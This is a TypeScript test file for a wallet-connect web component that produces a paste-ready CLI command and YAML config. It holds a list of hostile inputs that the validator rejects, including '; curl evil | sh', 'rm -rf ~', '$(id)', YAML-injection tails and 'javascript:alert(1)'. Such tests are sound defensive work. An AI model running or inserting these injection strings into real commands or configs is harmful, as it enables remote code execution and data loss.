import { afterEach, describe, expect, it, vi } from 'vitest';
import { parseDocument } from 'yaml';
import { PoolConnect, connectBlocks, walletConnect } from '../src/elements/pool-connect';
import { PoolFeed } from '../src/feed';
import { FakeApi, settle } from './fake';

const relay = '12D3KooWFuA6F9bBybjmQ6ZWUd9hKK4GXHXGTnyY11zAXA1gbeu7';
const coordinator = '12D3KooWG1BX6cWMmpR5wVCWyST5HCa5WmeVoCcZpFss4pzv8TSY';
const server = `/ip4/139.59.159.19/udp/55223/udx/p2p/${relay}`;
const good = {
  network: 'testnet',
  server,
  coordinator,
  peers: ['198.154.93.206:18333', '51.79.25.225:18333', '3.123.101.88:18333'],
  arcUrl: 'https://testnet.arc.gorillapool.io/v1',
};

describe('connectBlocks: the command a user pastes', () => {
  it('names the network, the server and the coordinator, and nothing else', () => {
    expect(connectBlocks(good)?.command).toBe(`cloak init --network testnet --server ${server} --pool ${coordinator}`);
  });

  it('gives a whole version 1 config with no key twice, naming the same values and cloak\'s defaults', () => {
    const config = connectBlocks(good)!.config;
    const doc = parseDocument(config, { uniqueKeys: true });
    expect(doc.errors).toEqual([]);
    expect(doc.toJS()).toEqual({
      version: 1,
      network: 'testnet',
      pool: { server, coordinator, timeout_seconds: 30 },
      chain: { confirmations: 6, peers: good.peers },
      deposit: { refund_margin: 144, refund_minimum: 100 },
      arc: { url: good.arcUrl },
    });
  });

  it('leaves the ARC URL to cloak when none is given, lists no peers as [], and takes one confirmation on regtest', () => {
    const js = parseDocument(connectBlocks({ ...good, network: 'regtest', peers: [], arcUrl: null })!.config).toJS();
    expect(js.arc).toEqual({ url: null });
    expect(js.chain).toEqual({ confirmations: 1, peers: [] });
    expect(connectBlocks({ ...good, peers: undefined, arcUrl: undefined })).not.toBeNull();
  });

  it('takes an ip6 server and host-name peers', () => {
    expect(connectBlocks({ ...good, server: `/ip6/2001:db8::7/udp/55223/udx/p2p/${relay}`, peers: ['seed.example.org:18333'] })).not.toBeNull();
  });
});

describe('connectBlocks: a value that is not what it claims hides everything', () => {
  const hostile: [string, Record<string, unknown>][] = [
    ['null', { wallet: null }],
    ['a string', { wallet: 'x' }],
    ['network mainnet-ish', { network: 'test' }],
    ['network with a space', { network: 'testnet ' }],
    ['network injection', { network: 'testnet --server evil' }],
    ['server with a shell tail', { server: `${server}; curl evil | sh` }],
    ['server with a newline', { server: `${server}\nrm -rf ~` }],
    ['server as dns4', { server: `/dns4/relay.testnet.shieldpool.net/udp/55223/udx/p2p/${relay}` }],
    ['server over tcp', { server: `/ip4/139.59.159.19/tcp/55223/p2p/${relay}` }],
    ['server octet 256', { server: `/ip4/139.59.159.256/udp/55223/udx/p2p/${relay}` }],
    ['server port 0', { server: `/ip4/139.59.159.19/udp/0/udx/p2p/${relay}` }],
    ['server port 70000', { server: `/ip4/139.59.159.19/udp/70000/udx/p2p/${relay}` }],
    ['server with an extra segment', { server: `${server}/p2p-circuit` }],
    ['server peer id with 0', { server: `/ip4/139.59.159.19/udp/55223/udx/p2p/12D3KooW0uA6F9bBybjmQ6ZWUd9hKK4GXHXGTnyY11zAXA1gbeu7` }],
    ['server ip6 without colons', { server: `/ip6/2001db8/udp/55223/udx/p2p/${relay}` }],
    ['server with $()', { server: `/ip4/139.59.159.19/udp/55223/udx/p2p/$(id)` }],
    ['coordinator too long', { coordinator: coordinator.repeat(2) }],
    ['coordinator with a quote', { coordinator: `${coordinator}'` }],
    ['coordinator with look-alike unicode', { coordinator: coordinator.replace('K', 'К') }],
    ['coordinator a number', { coordinator: 12 }],
    ['peers not a list', { peers: '198.154.93.206:18333' }],
    ['peer without a port', { peers: ['198.154.93.206'] }],
    ['peer port 0', { peers: ['198.154.93.206:0'] }],
    ['peer port with a plus', { peers: ['198.154.93.206:+18333'] }],
    ['peer with a YAML tail', { peers: ['1.2.3.4:18333\n  evil: yes'] }],
    ['peer with a space', { peers: ['a b:18333'] }],
    ['peer with a semicolon', { peers: ['x;rm:18333'] }],
    ['peer with an empty host', { peers: [':18333'] }],
    ['nine peers', { peers: Array.from({ length: 9 }, (_, i) => `10.0.0.${i}:18333`) }],
    ['arc over http', { arcUrl: 'http://testnet.arc.gorillapool.io/v1' }],
    ['arc javascript:', { arcUrl: 'javascript:alert(1)' }],
    ['arc with a space', { arcUrl: 'https://a.example/v1 --x' }],
    ['arc with $', { arcUrl: 'https://a.example/$HOME' }],
    ['arc with a query', { arcUrl: 'https://a.example/v1?x=1' }],
    ['arc with credentials', { arcUrl: 'https://user:pw@a.example/v1' }],
    ['arc with a newline', { arcUrl: 'https://a.example/v1\nevil: yes' }],
    ['arc with a bad port', { arcUrl: 'https://a.example:99999/v1' }],
    ['arc with look-alike unicode', { arcUrl: 'https://аrc.example/v1' }],
  ];

  it.each(hostile)('%s', (_, over) => {
    const w = 'wallet' in over ? over['wallet'] : { ...good, ...over };
    expect(walletConnect(w)).toBeNull();
    expect(connectBlocks(w)).toBeNull();
  });

  it('covers at least 30 values', () => expect(hostile.length).toBeGreaterThanOrEqual(30));
});

describe('<pool-connect>', () => {
  const feeds: PoolFeed[] = [];
  afterEach(() => {
    for (const f of feeds.splice(0)) f.stop();
    document.body.replaceChildren();
    vi.restoreAllMocks();
  });

  async function mounted(wallet: unknown): Promise<PoolConnect> {
    const api = new FakeApi(1);
    api.wallet = wallet;
    const feed = new PoolFeed(api);
    feeds.push(feed);
    await feed.start();
    const el = document.createElement('pool-connect');
    el.id = 'connect';
    el.feed = feed;
    document.body.append(el);
    for (let i = 0; i < 3; i++) {
      await settle();
      await el.updateComplete;
    }
    return el;
  }

  it('not named: the host is hidden and renders nothing', async () => {
    const el = await mounted(null);
    expect(el.hidden).toBe(true);
    expect(el.shadowRoot!.querySelector('h2')).toBeNull();
  });

  it('a hostile value: the host is hidden', async () => {
    expect((await mounted({ ...good, server: `${server}; sh` })).hidden).toBe(true);
  });

  it('named: the heading and both blocks, exactly as connectBlocks gives them', async () => {
    const el = await mounted(good);
    expect(el.hidden).toBe(false);
    const root = el.shadowRoot!;
    expect(root.querySelector('h2')?.textContent).toBe('Connect a wallet');
    const blocks = connectBlocks(good)!;
    expect(root.querySelector('pre[data-block="command"]')?.textContent).toBe(blocks.command);
    expect(root.querySelector('pre[data-block="config"]')?.textContent).toBe(blocks.config);
  });

  it('copying puts exactly the block on the clipboard and says so', async () => {
    const writes: string[] = [];
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t: string) => void writes.push(t) } });
    const el = await mounted(good);
    const buttons = el.shadowRoot!.querySelectorAll('button');
    buttons[1]!.click();
    await settle();
    await el.updateComplete;
    expect(writes).toEqual([connectBlocks(good)!.config]);
    expect(buttons[1]!.textContent?.trim()).toBe('Copied');
    expect(buttons[0]!.textContent?.trim()).toBe('Copy');
  });

  it('with no clipboard, the block is selected instead', async () => {
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: () => Promise.reject(new Error('denied')) } });
    const el = await mounted(good);
    el.shadowRoot!.querySelectorAll('button')[0]!.click();
    await settle();
    await el.updateComplete;
    expect(el.shadowRoot!.querySelectorAll('button')[0]!.textContent?.trim()).toBe('Selected');
  });
});
